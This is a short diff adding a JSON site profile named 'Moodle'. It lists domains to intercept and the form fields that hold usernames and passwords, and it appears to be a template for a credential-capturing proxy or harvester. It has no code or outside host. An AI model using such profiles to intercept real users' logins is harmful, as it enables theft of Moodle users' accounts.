@@ -1,0 +1,6 @@
+{
+    "name": "Moodle",
+    "intercept_domains": ["moodle"],
+    "username_fields": ["username", "user", "email"],
+    "password_fields": ["password", "pass"]
+}
